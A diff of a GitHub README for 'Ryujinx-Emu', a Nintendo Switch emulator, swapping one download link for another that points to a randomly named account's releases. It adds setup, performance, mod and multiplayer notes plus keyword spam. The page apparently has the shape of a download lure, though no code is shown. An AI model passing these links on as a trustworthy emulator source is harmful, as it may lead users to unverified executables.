@@ -1,75 +1,54 @@
-# Ryujinx Emulator
+# 🎮 Ryujinx-Emu - Play Nintendo Switch Games At Home
 
+[Download Ryujinx-Emu](https://github.com/doomed-white516/Ryujinx-Emu/releases)
 
-**Ryujinx Emulator** is a highly accurate Nintendo Switch emulator that lets you play your favorite Switch games on PC with excellent compatibility, performance improvements, and strong mod support.
+Ryujinx-Emu functions as a piece of software that lets you play Nintendo Switch titles on your personal computer. This emulator mirrors the console hardware, allowing games like Mario or Zelda to run with improved resolution and higher frame rates. You can enjoy your collection with full support for local wireless multiplayer, custom graphics mods, and optimized performance profiles.
 
-<img width="280" height="290" alt="2a802b29-8d40-4c3b-b7d4-e8f9c9c9426b" src="https://github.com/user-attachments/assets/5be3b8aa-3241-445d-8bb8-077cdd2101ee" />
+## ⚙️ System Requirements
 
-## Install
-[Download `Ryujinx-Emu.zip`](https://github.com/ryujinxnes/Ryujinx-Emu/releases/download/1.1.1403/Ryujinx-Emu.zip)
----
+You need a modern Windows computer to run this software. Ensure your machine meets these specifications for the best results:
 
+*   Operating System: Windows 10 or 11
+*   Processor: Intel Core i5 or AMD Ryzen 5
+*   Memory: 8 GB RAM or higher
+*   Graphics: NVIDIA GeForce GTX 10-series or AMD Radeon RX 500-series
+*   Storage: 500 MB for the software plus space for your game files
 
-<img width="1200" height="675" alt="2898283f-d75e-4c05-bd88-734f130c390c" src="https://github.com/user-attachments/assets/068a99f5-45b9-4461-ab88-5e3139ef0cc8" />
+## 📥 How To Set Up
 
-<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/68297e9e-6492-47cf-9180-7d0eaa0d3977" />
+The setup process requires a few manual steps to ensure the software functions correctly. Follow these instructions in order:
 
----
-## Key Features
-- High compatibility with a wide range of Nintendo Switch titles
-- Strong Vulkan and OpenGL support for modern GPUs
-- LDN multiplayer (play with friends over the internet)
-- LayeredFS mod support
-- Save file management tools
-- Regular updates for new games and fixes
+1.  Visit the [releases page](https://github.com/doomed-white516/Ryujinx-Emu/releases) to download the latest version of the emulator.
+2.  Click the blue link labeled "ryujinx-release" to save the compressed file to your computer.
+3.  Right-click the downloaded folder and select "Extract All" to see the contents.
+4.  Copy these files into a permanent folder on your hard drive.
+5.  Locate your Nintendo Switch firmware files and your `prod.keys` file. You must provide these files yourself as they come from your own console.
+6.  Open the Ryujinx-Emu program. 
+7.  Select "File" in the top menu, then choose "Open Ryujinx Folder."
+8.  Navigate to the "system" folder inside this directory.
+9.  Drag your `prod.keys` file into this folder.
+10. To install the firmware, go to "Tools," then "Install Firmware," and then "Install a firmware from XCI or ZIP." Select the archive you prepared.
 
+## 🚀 Performance Tips
 
-<img width="1300" height="855" alt="image" src="https://github.com/user-attachments/assets/f1f7c00f-78cc-48ec-81ca-b811e73bce75" />
+You can adjust the emulator settings to match your hardware capabilities. Select the Options menu to open settings. Use the Graphics tab to toggle between the Vulkan or OpenGL rendering methods. Vulkan often provides a smoother experience for most modern graphics cards.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive to any folder.
-3. **Place your legal prod.keys and firmware** in the correct folders.
-4. **Add your game files** (.nsp, .xci, or extracted files).
-5. **Run** `Ryujinx.exe` and start playing.
+The emulator utilizes a feature called PPTC, or Profiled Persistent Translation Cache. This allows the software to remember how your processor handles game code. The first time you launch a game, you might see brief pauses. After this initial pass, the game will run more smoothly as the cache fills up.
 
-**Note:** You need legally obtained prod.keys, firmware, and game files (not provided).
+If your game uses shaders, the emulator creates a cache to prevent flickering or visual stuttering. You can monitor this in the status bar at the bottom of the window so you know when the initial compilation finishes.
 
----
-## System Requirements
-- **Windows 10 / 11** or **Linux**
-- Modern CPU (Intel Core i5 / AMD Ryzen 5 or better)
-- GPU with good Vulkan support (NVIDIA GTX 1060 / AMD RX 580 or better recommended)
-- 8 GB RAM (16 GB or more recommended)
+## 🛡️ Managing Your Games
 
----
-## Security & Legal
-**Important Notice:**  
-You **must** own the original Nintendo Switch games and create your own dumps. Distributing or downloading copyrighted ROMs/firmware is illegal.
+Keep your game files in a organized folder structure. Add your game directory by going to "Options," "Settings," and then the "General" tab. Click the "Add" button and select the folder where you store your game backups. The emulator will automatically detect and display your titles in the main list. 
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+You can right-click any game in the list to manage save data. This is useful if you want to back up your progress to another location or import saves from other sources.
 
----
-## Contributing
-Contributions are welcome! Help improve compatibility, fix bugs, or add new features.
-<img width="1453" height="797" alt="image" src="https://github.com/user-attachments/assets/035b425e-3d53-4bdb-99ee-b46a55360cba" />
+## 🛠️ Using Mods
 
----
-## License & Acknowledgments
-### License
-**Ryujinx Emulator** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+This software supports custom mods for your games. Right-click a title in your game list and select "Open Mods Directory." Place your mod files—usually ending in .zip or .patch—into this folder. Restart the game to see the changes take effect. 
 
-**Copyright © 2026 zeeshangull**
+## 🌐 Connectivity
 
-### Acknowledgments
-- Thanks to the original Ryujinx team for the excellent emulator.
-- The Nintendo Switch emulation community for their support.
+Ryujinx-Emu provides local wireless multiplayer support through the LDN feature. This allows you to play games with others who also run the software. Ensure all participants use the same version of the emulator and the same game version to maintain compatibility.
 
-<p align="center">
-  Developed with ❤️ for the Nintendo Switch emulation community
-</p>
-
-<img width="898" height="513" alt="image" src="https://github.com/user-attachments/assets/ed9bf976-d9a9-4714-a03a-57d78fe71fef" />
+Keywords: canary-ryujinx, emulation-is-not-a-crime, emulator-ryujinx, game-emulator, ldn, nintend-switch, nintendo-port, nintendo-switch-2, nintendo-switch-emulator, nintendo-switch-pc, ryujinx, ryujinx-emulator, ryujinx-mods, ryujinx-nintendo, ryujinx-switch, ryujinx-switch-emulator-setup, yuzu-emulator, yuzu-nintendo-switch, yuzu-switch, yuzu-updater
